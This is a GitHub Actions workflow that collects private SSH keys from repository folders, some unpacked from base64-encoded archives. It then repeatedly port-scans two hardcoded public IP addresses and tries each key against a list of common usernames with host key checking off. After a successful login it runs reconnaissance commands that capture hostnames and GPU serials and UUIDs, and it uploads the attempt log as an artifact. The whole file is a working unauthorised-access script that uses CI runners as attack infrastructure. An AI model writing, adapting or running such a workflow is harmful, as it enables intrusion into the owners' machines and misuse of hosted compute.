name: ul6553-sshmx
on:
  workflow_dispatch:
    inputs:
      minutes:
        description: watch minutes
        required: false
        default: "18"
permissions:
  contents: read
jobs:
  matrix:
    runs-on: ubuntu-latest
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@v4
      - name: keycorpus
        run: |
          set +e
          mkdir -p /tmp/k; n=0
          for f in $(find keys keys2 az i724 -type f 2>/dev/null); do
            if head -c 40 "$f" 2>/dev/null | grep -q 'PRIVATE KEY'; then
              n=$((n+1)); cp "$f" /tmp/k/k$(printf %03d $n); chmod 600 /tmp/k/k$(printf %03d $n)
            elif head -c 3 "$f" 2>/dev/null | grep -q 'H4sI'; then
              base64 -d "$f" 2>/dev/null > /tmp/k.tar.gz; mkdir -p /tmp/kt; tar -xzf /tmp/k.tar.gz -C /tmp/kt 2>/dev/null
              for g in $(find /tmp/kt -type f 2>/dev/null); do head -c 40 "$g" | grep -q 'PRIVATE KEY' && { n=$((n+1)); cp "$g" /tmp/k/k$(printf %03d $n); chmod 600 /tmp/k/k$(printf %03d $n); }; done
            fi
          done
          echo "keys=$n"; ls /tmp/k | wc -l
          for f in /tmp/k/*; do ssh-keygen -y -f "$f" >/dev/null 2>&1 && echo "ok $(basename $f) $(ssh-keygen -y -f $f | cut -c1-40)" || echo "bad $(basename $f)"; done | head -40
      - name: probe-and-matrix
        run: |
          set +e
          MIN="${{ github.event.inputs.minutes }}"; [ -z "$MIN" ] && MIN=18
          echo "EGRESS=$(curl -s -m 8 https://ifconfig.me)"
          TARGETS="40.123.206.138 51.104.16.184"
          USERS="t19 azureuser ubuntu root admin ul"
          : > /tmp/mx.tsv; landed=0
          deadline=$(( $(date +%s) + MIN*60 ))
          while [ $(date +%s) -lt $deadline ]; do
            TS=$(date -u +%FT%TZ); for ip in $TARGETS; do
              P=""
              for p in 22 443 3389 5985 5986; do
                timeout 4 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null && P="$P $p:open" || P="$P $p:closed"
              done
              echo "PROBE $TS $ip $P"
              case "$P" in *22:open*)
                echo "WINDOW $TS $ip"
                for u in $USERS; do for k in /tmp/k/*; do
                  O=$(timeout 16 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa "$u@$ip" 'id' 2>&1); rc=$?
                  echo -e "$ip\t$u\t$(basename $k)\trc$rc\t$(echo "$O"|head -1|cut -c1-120)" >> /tmp/mx.tsv
                  if [ $rc -eq 0 ]; then echo "AUTH_OK $ip $u $k"; timeout 20 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o PubkeyAcceptedAlgorithms=+ssh-rsa "$u@$ip" 'id; hostname -I; hostname; uname -a; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv' > /tmp/full_$ip.txt 2>&1; landed=1; break 2; fi
                done; done ;;
              esac
            done; [ $landed -eq 1 ] && break; sleep 30
          done
          echo "=== MATRIX ==="; tail -30 /tmp/mx.tsv
          echo "=== FULL ==="; cat /tmp/full_*.txt 2>/dev/null | head -40
      - uses: actions/upload-artifact@v4
        if: always()
        with: {name: ul6553-sshmx, path: /tmp/mx.tsv}
